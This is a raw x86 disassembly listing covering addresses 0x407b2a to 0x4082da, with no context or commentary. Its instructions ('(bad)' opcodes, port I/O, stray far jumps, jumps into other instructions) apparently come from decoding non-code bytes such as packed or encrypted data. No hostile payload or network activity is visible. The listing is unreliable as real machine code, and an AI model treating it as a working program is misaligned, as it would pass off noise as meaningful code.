  407b2a:	xchg   ebp,eax
  407b2b:	inc    edx
  407b2c:	pop    edi
  407b2d:	cmp    al,0xa1
  407b2f:	rol    BYTE PTR [esi],cl
  407b31:	adc    al,0x5d
  407b33:	out    0x47,al
  407b35:	mov    ebx,0x6f0a4ea7
  407b3a:	in     al,dx
  407b3b:	pop    edx
  407b3c:	lods   eax,DWORD PTR ds:[esi]
  407b3d:	jecxz  0x407ad4
  407b3f:	mov    dh,0x3a
  407b41:	aam    0x8c
  407b43:	out    0x52,eax
  407b45:	xchg   edi,eax
  407b46:	and    BYTE PTR [esi+0x10],al
  407b49:	ins    BYTE PTR es:[edi],dx
  407b4a:	jo     0x407b4c
  407b4c:	pop    eax
  407b4d:	push   esp
  407b4e:	mov    dl,0x42
  407b50:	(bad)  
  407b51:	in     eax,0x58
  407b53:	or     bl,BYTE PTR [eax]
  407b55:	out    0xb6,eax
  407b57:	pop    esp
  407b58:	ss cmp bl,cl
  407b5b:	adc    eax,DWORD PTR [eiz*4-0x5f5a20aa]
  407b62:	sub    cl,bh
  407b64:	jle    0x407b5f
  407b66:	or     DWORD PTR [edx-0x5d],edx
  407b69:	jmp    0x1ca1:0xffc74c62
  407b70:	xchg   ecx,eax
  407b71:	cmp    BYTE PTR [esi-0x23d2b3c],al
  407b77:	loop   0x407b86
  407b79:	lods   al,BYTE PTR ds:[esi]
  407b7a:	pop    eax
  407b7b:	mov    eax,0x8a07807b
  407b80:	lock int3 
  407b82:	mov    BYTE PTR [edi+0xb],ch
  407b85:	sub    DWORD PTR [ebp-0x4a298d15],esp
  407b8b:	imul   edx,esp,0x9b8965ea
  407b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b92:	mov    esi,0xe6e3351a
  407b97:	jge    0x407b4c
  407b99:	xchg   edx,eax
  407b9a:	push   0x3e
  407b9c:	ss sub al,0xe5
  407b9f:	popf   
  407ba0:	sahf   
  407ba1:	inc    ebx
  407ba2:	add    BYTE PTR [esi],ch
  407ba4:	int3   
  407ba5:	mov    edi,0xb4d81394
  407baa:	cmp    ebp,eax
  407bac:	dec    esp
  407bad:	dec    esi
  407bae:	push   0xffffffb4
  407bb0:	fld    TBYTE PTR [edi+0x5]
  407bb3:	out    dx,eax
  407bb4:	das    
  407bb5:	clc    
  407bb6:	xor    ah,ah
  407bb8:	dec    edx
  407bb9:	sbb    dh,dl
  407bbb:	ret    0xa357
  407bbe:	fsub   DWORD PTR ds:0x62c6f375
  407bc4:	jbe    0x407ba1
  407bc6:	clc    
  407bc7:	outs   dx,DWORD PTR ds:[esi]
  407bc8:	push   edi
  407bc9:	out    dx,eax
  407bca:	pop    ecx
  407bcb:	stc    
  407bcc:	lods   al,BYTE PTR ds:[esi]
  407bcd:	push   esp
  407bce:	popa   
  407bcf:	push   cs
  407bd0:	mov    dh,0x6c
  407bd2:	mov    ebx,edi
  407bd4:	idiv   DWORD PTR [ecx-0x38]
  407bd7:	fst    DWORD PTR [ecx-0x74]
  407bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bdb:	push   ebx
  407bdc:	inc    edi
  407bdd:	inc    ebx
  407bde:	jbe    0x407b7a
  407be0:	mov    eax,ds:0xc80b5c84
  407be5:	int    0x1
  407be7:	push   ebx
  407be8:	sub    ebx,edi
  407bea:	mov    ebp,ebx
  407bec:	pop    edi
  407bed:	cld    
  407bee:	sbb    al,0xa2
  407bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bf1:	xchg   edx,eax
  407bf2:	xchg   edi,eax
  407bf3:	add    al,0xfc
  407bf5:	in     eax,0xd
  407bf7:	iret   
  407bf8:	adc    DWORD PTR [ebp-0x5eb57b90],0x64
  407bff:	push   ss
  407c00:	scas   eax,DWORD PTR es:[edi]
  407c01:	(bad)  
  407c03:	mov    eax,0x9734fe19
  407c08:	mov    dh,0x28
  407c0a:	mov    ah,BYTE PTR [ebx+eiz*8]
  407c0d:	jl     0x407be5
  407c0f:	push   ebp
  407c10:	mov    edi,ebp
  407c12:	push   esp
  407c13:	loop   0x407bf8
  407c15:	inc    ebp
  407c16:	or     eax,0x5e584f6
  407c1b:	pusha  
  407c1c:	xor    dh,bl
  407c1e:	das    
  407c1f:	ret    0x3555
  407c22:	mov    al,ds:0x9ce24476
  407c27:	or     edi,ecx
  407c29:	and    al,0x94
  407c2b:	push   edi
  407c2c:	jmp    0xa44c85bd
  407c31:	or     bl,cl
  407c33:	bound  esp,QWORD PTR [eax]
  407c35:	js     0x407c07
  407c37:	jo     0x407bd7
  407c39:	dec    ebp
  407c3a:	out    0x8b,eax
  407c3c:	repz shr BYTE PTR [ebx-0x70ed2137],0xbf
  407c44:	dec    ebx
  407c45:	cwde   
  407c46:	pop    edx
  407c47:	push   0xffffffb9
  407c49:	mov    esp,0x2484c399
  407c4e:	push   ss
  407c4f:	adc    DWORD PTR [esi-0x7d],ecx
  407c52:	addr16 dec esi
  407c54:	mov    ebx,0xe58b8825
  407c59:	pop    ebp
  407c5a:	mov    esp,ds
  407c5c:	mov    ah,0x11
  407c5e:	dec    eax
  407c5f:	mov    dh,0x43
  407c61:	loope  0x407cd5
  407c63:	ror    bh,cl
  407c65:	or     BYTE PTR [ecx-0x74],dl
  407c68:	inc    ebp
  407c69:	inc    edx
  407c6a:	test   eax,0x6f8e125a
  407c6f:	repnz and al,0x35
  407c72:	sub    ch,BYTE PTR [ebx+0x1adca9d]
  407c78:	(bad)  
  407c7a:	jg     0x407c2e
  407c7c:	fcomp  st(7)
  407c7e:	aam    0x43
  407c80:	je     0x407c95
  407c82:	push   cs
  407c83:	xchg   edx,eax
  407c84:	lock add DWORD PTR [edi-0x17],edi
  407c88:	or     ch,BYTE PTR [ebx-0x7307336f]
  407c8e:	mov    BYTE PTR [edx+eiz*4-0x2e],0x40
  407c93:	mov    ds:0xb1e20c73,al
  407c98:	push   cs
  407c99:	cli    
  407c9a:	(bad)  
  407c9b:	xchg   ebx,eax
  407c9c:	fsubr  st,st(0)
  407c9e:	ins    DWORD PTR es:[edi],dx
  407c9f:	mov    WORD PTR [eax+0x59],?
  407ca2:	stos   BYTE PTR es:[edi],al
  407ca3:	aam    0xd3
  407ca5:	sub    eax,DWORD PTR [eax]
  407ca7:	mov    eax,0x9e8500ee
  407cac:	mov    edx,ss
  407cae:	lahf   
  407caf:	inc    ebp
  407cb0:	ss push ebp
  407cb2:	mov    ebp,0x54f10122
  407cb7:	ds pop edi
  407cb9:	pop    es
  407cba:	pop    ss
  407cbb:	cwde   
  407cbc:	adc    esp,DWORD PTR [ebp+0x33dd75fa]
  407cc2:	jmp    0x407cdc
  407cc4:	mov    BYTE PTR [eax-0x65],ch
  407cc7:	clc    
  407cc8:	int3   
  407cc9:	and    eax,0x876b86cb
  407cce:	pop    ebx
  407ccf:	inc    eax
  407cd0:	xchg   ebp,eax
  407cd1:	ins    DWORD PTR es:[edi],dx
  407cd2:	push   es
  407cd3:	repnz popf 
  407cd5:	and    BYTE PTR [ebx],dl
  407cd7:	inc    ebx
  407cd8:	retf   
  407cd9:	shl    BYTE PTR [esi-0x7b],1
  407cdc:	sbb    ecx,edi
  407cde:	test   al,0x81
  407ce0:	pop    es
  407ce1:	in     al,0x5b
  407ce3:	arpl   WORD PTR [edx+0x52f44d88],cx
  407ce9:	sub    al,0xa7
  407ceb:	ds pop edx
  407ced:	(bad)  
  407cef:	add    ebp,esp
  407cf1:	xchg   BYTE PTR [eax],cl
  407cf3:	std    
  407cf4:	in     eax,0x72
  407cf6:	mov    esp,edi
  407cf8:	and    eax,0xa324a629
  407cfd:	xor    esp,DWORD PTR [ebp-0x9]
  407d00:	mov    dl,0x82
  407d02:	sti    
  407d03:	inc    esp
  407d04:	pop    ebp
  407d05:	ja     0x407cc9
  407d07:	(bad)  
  407d08:	pop    ecx
  407d09:	bound  edi,QWORD PTR [edx-0x2b]
  407d0c:	dec    ebx
  407d0d:	mov    cl,0x6c
  407d0f:	test   eax,0xdd3500a0
  407d14:	sar    BYTE PTR [edi-0x1b6f7221],1
  407d1a:	mov    eax,0xfdaaa3c
  407d1f:	xchg   edx,eax
  407d20:	cmp    BYTE PTR [edi+0x13],ah
  407d23:	jnp    0x407cf2
  407d25:	shl    ch,0x60
  407d28:	dec    edi
  407d29:	dec    esi
  407d2a:	add    DWORD PTR [edx+0x54fc329c],esi
  407d30:	push   esp
  407d31:	and    cl,BYTE PTR [ebx-0x28]
  407d34:	adc    al,BYTE PTR [edi-0x19f52e4]
  407d3a:	leave  
  407d3b:	mov    dh,0x59
  407d3d:	lds    esp,FWORD PTR [esi]
  407d3f:	cmp    al,BYTE PTR [ebx+0x3c]
  407d42:	xchg   edi,eax
  407d43:	pop    edi
  407d44:	mov    esi,0x88db6225
  407d49:	cmp    dl,BYTE PTR [ebx]
  407d4b:	daa    
  407d4c:	push   edi
  407d4d:	add    BYTE PTR [ecx],dl
  407d4f:	jmp    0x9bb5:0xf22d7cc4
  407d56:	cmc    
  407d57:	pop    ds
  407d58:	sbb    eax,0x9becbee4
  407d5d:	xchg   edi,eax
  407d5e:	or     al,0x1b
  407d60:	aad    0xf3
  407d62:	and    ebx,eax
  407d64:	stos   DWORD PTR es:[edi],eax
  407d65:	inc    ebp
  407d66:	push   es
  407d67:	into   
  407d68:	fsubr  st(4),st
  407d6a:	fnstenv [eax]
  407d6c:	jae    0x407d85
  407d6e:	ins    BYTE PTR es:[edi],dx
  407d6f:	retf   
  407d70:	std    
  407d71:	inc    edi
  407d72:	cmc    
  407d73:	mov    ch,0xdc
  407d75:	fisttp DWORD PTR [esi-0x6c95f312]
  407d7b:	retf   
  407d7c:	jbe    0x407d39
  407d7e:	(bad)  
  407d80:	jmp    0xcfdeceb0
  407d85:	in     eax,dx
  407d86:	inc    esi
  407d87:	imul   esi,DWORD PTR ds:0x16e6eeba,0x6c
  407d8e:	and    eax,0x670053e
  407d93:	mov    ch,0x7e
  407d95:	fcomp  DWORD PTR [edi+0x2880cc10]
  407d9b:	push   cs
  407d9c:	aam    0x2c
  407d9e:	pop    edi
  407d9f:	xchg   ebp,eax
  407da0:	(bad)  
  407da1:	lods   al,BYTE PTR ds:[esi]
  407da2:	ins    BYTE PTR es:[edi],dx
  407da3:	mov    esp,0x4ab2f16c
  407da8:	imul   eax,DWORD PTR [ebx],0xdefa651f
  407dae:	icebp  
  407daf:	clc    
  407db0:	outs   dx,BYTE PTR ds:[esi]
  407db1:	jecxz  0x407e04
  407db3:	push   edi
  407db4:	cmp    dh,BYTE PTR [ebx-0x2a]
  407db7:	dec    DWORD PTR [ebp-0x49601378]
  407dbd:	sub    al,0xff
  407dbf:	push   ss
  407dc0:	push   0xfffffffe
  407dc2:	shl    BYTE PTR [edi],0x2e
  407dc5:	fadd   QWORD PTR [edi-0x753a3c8a]
  407dcb:	jae    0x407dab
  407dcd:	adc    BYTE PTR [ebp+ecx*8-0x66adb7d1],bl
  407dd4:	mov    bh,al
  407dd6:	inc    ecx
  407dd7:	pop    ds
  407dd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd9:	icebp  
  407dda:	int3   
  407ddb:	mov    ss,WORD PTR [ebx]
  407ddd:	push   ecx
  407dde:	shl    DWORD PTR [edi],cl
  407de0:	mov    bh,0x50
  407de2:	xchg   DWORD PTR [edx],eax
  407de4:	(bad)
  407de7:	fldenv [edx]
  407de9:	adc    dh,BYTE PTR [edi]
  407deb:	jge    0x407e05
  407ded:	mov    dl,0xf0
  407def:	add    ah,BYTE PTR fs:[eax]
  407df2:	cmp    bh,0x3c
  407df5:	add    al,0x63
  407df7:	jo     0x407d90
  407df9:	pop    es
  407dfa:	jmp    0x407e27
  407dfc:	retf   0xe88b
  407dff:	enter  0x850d,0xab
  407e03:	aaa    
  407e04:	aad    0xc8
  407e06:	addr16 mov ebx,0x72f8c8bf
  407e0c:	scas   al,BYTE PTR es:[edi]
  407e0d:	sbb    esi,DWORD PTR [ebx]
  407e0f:	adc    BYTE PTR [ecx],dh
  407e11:	dec    esp
  407e12:	dec    ecx
  407e13:	mov    edi,0xe1c55bfa
  407e18:	push   ss
  407e19:	loop   0x407e72
  407e1b:	icebp  
  407e1c:	popa   
  407e1d:	and    eax,0x2de1ba78
  407e22:	sub    eax,0xe7df7fde
  407e27:	cmp    al,0x9
  407e29:	push   cs
  407e2a:	call   0x274a:0xa48d7e89
  407e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e32:	(bad)  
  407e33:	push   0x40c3e59b
  407e38:	mov    ds:0xca9cf02c,al
  407e3d:	and    bl,ah
  407e3f:	xlat   BYTE PTR ds:[ebx]
  407e40:	icebp  
  407e41:	dec    ecx
  407e42:	stos   DWORD PTR es:[edi],eax
  407e43:	fldcw  WORD PTR [ebp-0x50219f69]
  407e49:	sbb    eax,0xdf8aff08
  407e4e:	inc    esi
  407e4f:	mov    cl,0x42
  407e51:	cmp    esi,DWORD PTR [edx]
  407e53:	imul   edi,esp,0xffffffd6
  407e56:	repnz sbb eax,0x4ac27314
  407e5c:	daa    
  407e5d:	aaa    
  407e5e:	arpl   WORD PTR [esi-0x654eab27],bx
  407e64:	fnstcw WORD PTR [ebx+0x45]
  407e67:	add    al,0x92
  407e69:	cmp    al,BYTE PTR [ebp+0x72fe5e4a]
  407e6f:	xor    edi,DWORD PTR [bx+si]
  407e72:	dec    esi
  407e73:	xor    DWORD PTR [esi+0xaf07834],0x8fab9ec0
  407e7d:	ret    
  407e7e:	scas   eax,DWORD PTR es:[di]
  407e80:	fild   WORD PTR [esi]
  407e82:	outs   dx,DWORD PTR ds:[esi]
  407e83:	pop    eax
  407e84:	fcmovnbe st,st(5)
  407e86:	sbb    dh,BYTE PTR ds:0xfdf24ef
  407e8c:	gs add eax,0x3096728e
  407e92:	mov    eax,0xb19145be
  407e97:	mov    cl,0xe8
  407e99:	inc    esp
  407e9a:	fwait
  407e9b:	repnz mov eax,0x1831110d
  407ea1:	jo     0x407e65
  407ea3:	outs   dx,DWORD PTR ds:[esi]
  407ea4:	push   ebp
  407ea5:	xor    eax,0x7c957dcc
  407eaa:	pop    eax
  407eab:	aaa    
  407eac:	mov    ?,WORD PTR [esi-0x6b]
  407eaf:	adc    eax,0xd4da61c7
  407eb4:	stos   DWORD PTR es:[edi],eax
  407eb5:	push   edi
  407eb6:	jge    0x407e5a
  407eb8:	out    dx,al
  407eb9:	add    edx,eax
  407ebb:	out    0xb8,al
  407ebd:	shl    DWORD PTR [bx+si],0x64
  407ec1:	clc    
  407ec2:	aad    0x93
  407ec4:	out    dx,al
  407ec5:	jne    0x407eaa
  407ec7:	sbb    ebx,DWORD PTR [ecx+0x38f0339]
  407ecd:	cli    
  407ece:	out    0x28,eax
  407ed0:	stc    
  407ed1:	sub    ecx,DWORD PTR [ebp+0x47a9cb17]
  407ed7:	jns    0x407f43
  407ed9:	xchg   ebp,eax
  407eda:	fldcw  WORD PTR [eax]
  407edc:	ins    BYTE PTR es:[edi],dx
  407edd:	pop    ecx
  407ede:	mov    esi,0x75f6dcb4
  407ee3:	adc    bl,ah
  407ee5:	push   cs
  407ee6:	jo     0x407e8d
  407ee8:	not    DWORD PTR [ecx-0x68]
  407eeb:	dec    esp
  407eec:	je     0x407f6a
  407eee:	addr16 push ebx
  407ef0:	sbb    BYTE PTR [ebx],ah
  407ef2:	imul   ebx,ecx,0xffffffe7
  407ef5:	or     BYTE PTR [eax+ecx*2],cl
  407ef8:	pop    ecx
  407ef9:	add    ebx,DWORD PTR [ebp+0x55d6cbbe]
  407eff:	and    DWORD PTR ds:0x8f6d8962,esp
  407f05:	sub    BYTE PTR [eax+0x20],bl
  407f08:	sbb    esi,esi
  407f0a:	mov    eax,ds:0x356d6fa8
  407f0f:	mov    ds:0x64d2642f,al
  407f14:	mov    ecx,DWORD PTR [edx-0x7040ae61]
  407f1a:	adc    DWORD PTR [edi-0x17],edi
  407f1d:	fwait
  407f1e:	mov    eax,ds:0xcae1bfa4
  407f23:	xchg   DWORD PTR [edi-0x56],ebx
  407f26:	iret   
  407f27:	loopne 0x407ebe
  407f29:	jo     0x407ed3
  407f2b:	add    al,BYTE PTR [esi+ebx*4-0x71255d75]
  407f32:	mov    ebp,0xffa86610
  407f37:	add    dh,bh
  407f39:	loopne 0x407f45
  407f3b:	fisttp WORD PTR [edi+0x318e1f]
  407f41:	mov    ds:0xe6b75bcf,eax
  407f46:	ja     0x407f15
  407f48:	fnstsw WORD PTR [ecx+edx*2-0x7a]
  407f4c:	pop    edx
  407f4d:	shl    BYTE PTR [ecx],cl
  407f4f:	adc    BYTE PTR [edx],0x27
  407f52:	cmp    eax,0xfb40ec58
  407f57:	outs   dx,BYTE PTR ds:[esi]
  407f58:	add    ch,BYTE PTR [edx-0x461ede6a]
  407f5e:	rol    edi,0xaa
  407f61:	int    0xa1
  407f63:	mov    DWORD PTR [ebp+0x68dd7743],ebp
  407f69:	adc    al,0x1d
  407f6b:	mov    cl,0xbe
  407f6d:	jmp    0xea06:0x90b393c5
  407f74:	mov    WORD PTR [esp+edi*8-0x53a2118f],ds
  407f7b:	popa   
  407f7c:	push   ss
  407f7d:	mov    al,0xbe
  407f7f:	jbe    0x407f82
  407f81:	setne  BYTE PTR [ebp-0x127d81c3]
  407f88:	pop    ebx
  407f89:	je     0x408006
  407f8b:	jne    0x407f52
  407f8d:	arpl   sp,ax
  407f8f:	add    edx,edx
  407f91:	(bad)  
  407f92:	push   cs
  407f93:	dec    ecx
  407f94:	ror    bl,1
  407f96:	sbb    eax,0x134ceaa8
  407f9b:	sub    eax,0x5767bcdf
  407fa0:	hlt    
  407fa1:	jg     0x407f65
  407fa3:	fstp   QWORD PTR [ebp+0xe22f840]
  407fa9:	push   edx
  407faa:	add    BYTE PTR [eax],ah
  407fac:	sbb    edx,DWORD PTR [eax+esi*4-0x66]
  407fb0:	xor    DWORD PTR [esi-0x4f],edi
  407fb3:	(bad)  
  407fb5:	xor    BYTE PTR [ecx+ecx*2+0x23571ba7],al
  407fbc:	mov    ebp,0xa9140d2
  407fc1:	sub    al,BYTE PTR [eax+0x3301cc35]
  407fc7:	cli    
  407fc8:	loop   0x407f89
  407fca:	jb     0x407fc7
  407fcc:	mov    esp,0xc60a09d5
  407fd1:	inc    esp
  407fd2:	addr16 inc ebx
  407fd4:	pop    edi
  407fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fd6:	fimul  DWORD PTR [eax-0x5adb7464]
  407fdc:	inc    esi
  407fdd:	add    eax,0xd542f7b4
  407fe2:	lahf   
  407fe3:	jnp    0x407f86
  407fe5:	clc    
  407fe6:	mov    bh,0xf8
  407fe8:	jle    0x407fc0
  407fea:	repnz add BYTE PTR [eax],dh
  407fed:	push   esp
  407fee:	cmp    eax,0xc3a0f124
  407ff3:	imul   edx,ecx,0x69
  407ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ff7:	loope  0x408039
  407ff9:	cmp    eax,0x83c41f07
  407ffe:	jo     0x407fe6
  408000:	repnz in al,0x3d
  408003:	ins    BYTE PTR es:[edi],dx
  408004:	ret    
  408005:	mov    eax,ds:0x8abc824f
  40800a:	(bad)  
  40800b:	iret   
  40800c:	pop    eax
  40800d:	pop    es
  40800e:	aas    
  40800f:	add    eax,0xd2086dd2
  408014:	fwait
  408015:	and    BYTE PTR [ebp-0x3e],cl
  408018:	jg     0x407f9e
  40801a:	stos   BYTE PTR es:[edi],al
  40801b:	sbb    esp,DWORD PTR [eax+ebp*2]
  40801e:	adc    DWORD PTR [edx],0x7
  408021:	retf   0x3f59
  408024:	(bad)  
  408025:	shr    DWORD PTR [edi+esi*4+0x390d0cfd],1
  40802c:	dec    esi
  40802d:	mov    BYTE PTR ds:0xb77b838c,ah
  408033:	jg     0x408015
  408035:	or     DWORD PTR [edx],0x624156e7
  40803b:	pop    eax
  40803c:	dec    esi
  40803d:	jnp    0x407fc3
  40803f:	mov    bl,0x43
  408041:	and    DWORD PTR [ecx+0x19b1bab6],eax
  408047:	int    0x43
  408049:	jl     0x40804e
  40804b:	cli    
  40804c:	adc    ecx,DWORD PTR [edi]
  40804e:	xchg   ebp,eax
  40804f:	sbb    ebp,DWORD PTR [edi]
  408051:	mov    ebx,0x5c811a9
  408056:	test   BYTE PTR [eax+0x6f],ch
  408059:	mul    BYTE PTR [edx+0x676ce57a]
  40805f:	je     0x408099
  408061:	cmp    al,0xf3
  408063:	mov    dl,0x63
  408065:	out    0xec,eax
  408067:	push   0x1e
  408069:	outs   dx,DWORD PTR ds:[esi]
  40806a:	add    edi,DWORD PTR [ebp-0x1b]
  40806d:	dec    ecx
  40806e:	nop
  40806f:	aam    0xab
  408071:	dec    ebx
  408072:	inc    ecx
  408073:	fcomp  DWORD PTR [ebp+0x14]
  408076:	mov    BYTE PTR [eax+0x1d6ec961],dl
  40807c:	push   0x410a5a34
  408081:	mov    dh,0x5e
  408083:	aam    0x49
  408085:	int3   
  408086:	stc    
  408087:	neg    DWORD PTR [ebx+edi*8]
  40808a:	rcr    DWORD PTR [ecx+0x3ed92983],0x4c
  408091:	inc    esp
  408092:	mov    bl,0xbe
  408094:	xchg   edi,eax
  408095:	mov    DWORD PTR [ecx],0x57306ed8
  40809b:	add    BYTE PTR [ebx+0x41],bl
  40809e:	sar    DWORD PTR ds:0x9a35fa76,cl
  4080a4:	enter  0x2831,0xd2
  4080a8:	es out 0x18,al
  4080ab:	mov    ch,0x6e
  4080ad:	fisttp WORD PTR [ebp-0x2db75645]
  4080b3:	rcl    DWORD PTR [eax+0x3f],1
  4080b6:	ret    0x6f09
  4080b9:	jmp    0x88e:0xc29dd4fa
  4080c0:	jnp    0x408087
  4080c2:	pop    ebx
  4080c3:	mov    gs,WORD PTR ds:0x5e9ad651
  4080c9:	xlat   BYTE PTR ds:[ebx]
  4080ca:	inc    ebx
  4080cb:	push   ebp
  4080cc:	sahf   
  4080cd:	pop    ebp
  4080ce:	in     al,dx
  4080cf:	pop    esi
  4080d0:	in     eax,dx
  4080d1:	shl    BYTE PTR [edx-0x2d],1
  4080d4:	mov    ebx,0x2613abbf
  4080d9:	pusha  
  4080da:	sub    eax,0xbdc696c2
  4080df:	in     al,0xca
  4080e1:	sbb    esp,ebx
  4080e3:	dec    esi
  4080e4:	dec    esi
  4080e5:	pushf  
  4080e6:	lahf   
  4080e7:	adc    BYTE PTR [edi+0x42],0x9b
  4080eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ec:	mov    ah,0x55
  4080ee:	cmp    eax,0x4ce019a1
  4080f3:	xchg   esp,eax
  4080f4:	test   ch,cl
  4080f6:	xchg   BYTE PTR [ecx+0x348a8f28],ch
  4080fc:	push   ebp
  4080fd:	xchg   edi,eax
  4080fe:	loopne 0x4080ff
  408100:	out    0x10,al
  408102:	pop    es
  408103:	outs   dx,DWORD PTR ds:[esi]
  408104:	adc    DWORD PTR [edx-0x7a],edx
  408107:	and    bh,BYTE PTR [esi]
  408109:	sbb    DWORD PTR ds:0x409cdf12,0xc61f9268
  408113:	test   eax,0xbb25a31b
  408118:	ins    BYTE PTR es:[edi],dx
  408119:	xor    cl,BYTE PTR [edi+ebx*2]
  40811c:	xchg   ebx,eax
  40811d:	mov    ebp,0xb5938a6b
  408122:	fidiv  DWORD PTR [ecx]
  408124:	outs   dx,BYTE PTR ds:[esi]
  408125:	mov    eax,ds:0xd7f757f1
  40812a:	dec    esi
  40812b:	pop    ebp
  40812c:	xchg   esp,eax
  40812d:	push   esi
  40812e:	mov    ecx,0x7d89c5fc
  408133:	out    0x7b,eax
  408135:	jns    0x4080c6
  408137:	xor    BYTE PTR [edx+ebp*4+0x50],0x61
  40813c:	mov    esp,0x19d5d4fd
  408141:	loop   0x408125
  408143:	jmp    0x9c49:0x9d23c7d6
  40814a:	lods   al,BYTE PTR ds:[esi]
  40814b:	push   edx
  40814c:	repnz (bad) 
  40814f:	jae    0x4080f9
  408151:	iret   
  408152:	retf   0x93af
  408155:	mov    eax,0xf70fb362
  40815a:	push   ss
  40815b:	int    0x10
  40815d:	ja     0x408184
  40815f:	or     al,bh
  408161:	adc    BYTE PTR [edi+0x5b],bl
  408164:	push   es
  408165:	sbb    cl,bl
  408167:	stos   DWORD PTR es:[edi],eax
  408168:	mov    ch,0xef
  40816a:	mov    edi,0xf04a9ac9
  40816f:	xchg   esi,eax
  408170:	inc    esi
  408171:	jp     0x4081be
  408173:	les    ebp,FWORD PTR [esi+0x2f]
  408176:	mov    cl,0x9e
  408178:	test   al,0x36
  40817a:	mov    bl,0x4d
  40817c:	mov    dh,0x3
  40817e:	loop   0x40813b
  408180:	ins    DWORD PTR es:[edi],dx
  408181:	adc    bh,BYTE PTR [esi+0x1f51fcb6]
  408187:	fdiv   QWORD PTR [edi-0x37]
  40818a:	pop    ebx
  40818b:	ja     0x40817d
  40818d:	jb     0x4081e8
  40818f:	stos   BYTE PTR es:[edi],al
  408190:	daa    
  408191:	outs   dx,DWORD PTR ds:[esi]
  408192:	pop    ebx
  408193:	adc    DWORD PTR [ebx-0x16ae3aab],ebp
  408199:	cmp    eax,DWORD PTR [edx-0x4a]
  40819c:	jecxz  0x40814c
  40819e:	pushw  0x1f
  4081a1:	scas   eax,DWORD PTR es:[edi]
  4081a2:	ret    
  4081a3:	cdq    
  4081a4:	lds    ecx,FWORD PTR [ecx+0x7a765bea]
  4081aa:	sub    al,0x1c
  4081ac:	sbb    esi,ebx
  4081ae:	pusha  
  4081af:	test   BYTE PTR gs:[edi+0x73],bh
  4081b3:	les    esp,FWORD PTR [esp+eax*1-0x3aeda095]
  4081ba:	retf   0xab6c
  4081bd:	test   bl,dl
  4081bf:	outs   dx,BYTE PTR ds:[esi]
  4081c0:	pop    ds
  4081c1:	jl     0x408224
  4081c3:	pop    eax
  4081c4:	xchg   ecx,eax
  4081c5:	pop    esp
  4081c6:	ins    DWORD PTR es:[edi],dx
  4081c7:	inc    ebp
  4081c8:	xchg   esi,eax
  4081c9:	xchg   esi,eax
  4081ca:	inc    esp
  4081cb:	lds    esi,FWORD PTR [ecx+ecx*8-0x1923fa9b]
  4081d2:	out    dx,al
  4081d3:	cmp    DWORD PTR [edi-0x49af63b0],esp
  4081d9:	or     eax,DWORD PTR [eax-0x620245b9]
  4081df:	popa   
  4081e0:	mov    BYTE PTR [ebp+0xd],bh
  4081e3:	fnstenv [edi+0x78]
  4081e6:	cld    
  4081e7:	fist   WORD PTR [edx]
  4081e9:	sub    bh,BYTE PTR [edx-0x6f646925]
  4081ef:	out    dx,al
  4081f0:	fisub  DWORD PTR [edx+edx*4+0x7]
  4081f4:	mov    ah,0x6
  4081f6:	lock test al,0x47
  4081f9:	push   es
  4081fa:	or     ecx,edi
  4081fc:	addr16 dec esi
  4081fe:	and    ecx,eax
  408200:	push   edi
  408201:	shr    al,cl
  408203:	push   ecx
  408204:	loopne 0x4081f0
  408206:	jb     0x3b72ea82
  40820c:	enter  0xfe9e,0x27
  408210:	sbb    BYTE PTR ds:0x44168ea2,dh
  408216:	sti    
  408217:	adc    DWORD PTR [edi],esp
  408219:	pop    es
  40821a:	int3   
  40821b:	sub    eax,0xd05c3f0f
  408220:	or     eax,0xc95e2a85
  408225:	out    0xb6,al
  408227:	dec    esp
  408228:	popf   
  408229:	ins    DWORD PTR es:[edi],dx
  40822a:	int    0xd6
  40822c:	mov    al,ds:0xee76cadd
  408231:	mov    esi,0xba5cd03b
  408236:	adc    DWORD PTR [ebx+0x13cae6db],edi
  40823c:	sbb    BYTE PTR [ebx-0x48b10d1a],cl
  408242:	arpl   WORD PTR ds:0x7673ac85,cx
  408248:	pop    ebx
  408249:	and    dh,BYTE PTR [edx-0x69e12a94]
  40824f:	add    esp,edx
  408251:	push   0x548ff913
  408256:	or     al,BYTE PTR [eax+0x74]
  408259:	push   edi
  40825a:	div    BYTE PTR [edx+0x1f32fcb8]
  408260:	rcr    BYTE PTR [edx-0x20],0xc2
  408264:	and    al,0x61
  408266:	mov    bl,0x5d
  408268:	mov    al,0x99
  40826a:	xor    al,0x99
  40826c:	(bad)  
  40826d:	std    
  40826e:	aad    0x87
  408270:	xor    al,0x79
  408272:	jl     0x408262
  408274:	and    al,0x5
  408276:	std    
  408277:	aam    0x26
  408279:	push   es
  40827a:	fldcw  WORD PTR [edi-0x561140ab]
  408280:	mov    edi,0x385e14fa
  408285:	cmp    ecx,DWORD PTR [ebx+ebp*2]
  408288:	and    dh,BYTE PTR [ecx+0x68ae5c12]
  40828e:	jle    0x408216
  408290:	out    dx,al
  408291:	repnz sub cl,BYTE PTR [edi]
  408294:	xchg   esi,eax
  408295:	in     eax,dx
  408296:	fs loop 0x40825c
  408299:	fnop   
  40829b:	push   cs
  40829c:	ds adc eax,0x6cacaa84
  4082a2:	inc    edi
  4082a3:	mov    eax,0x570867e1
  4082a8:	push   0xa29909f4
  4082ad:	sar    BYTE PTR [edi+0x32],cl
  4082b0:	outs   dx,BYTE PTR ds:[esi]
  4082b1:	and    DWORD PTR [ecx-0xc],ecx
  4082b4:	call   0x223665c0
  4082b9:	ja     0x4082cb
  4082bb:	aam    0xe8
  4082bd:	ss push esp
  4082bf:	loop   0x4082f5
  4082c1:	mov    bl,0x9b
  4082c3:	adc    DWORD PTR [ebx],ebx
  4082c5:	in     al,0x22
  4082c7:	mov    bh,BYTE PTR [esi+0x1d23cb01]
  4082cd:	sar    BYTE PTR [edi],0x1d
  4082d0:	and    dh,BYTE PTR [eax]
  4082d2:	push   eax
  4082d3:	sbb    bl,BYTE PTR [esi+edi*4]
  4082d6:	lods   al,BYTE PTR ds:[esi]
  4082d7:	gs pop ebp
  4082d9:	xchg   esi,eax
  4082da:	call   0xd026d835
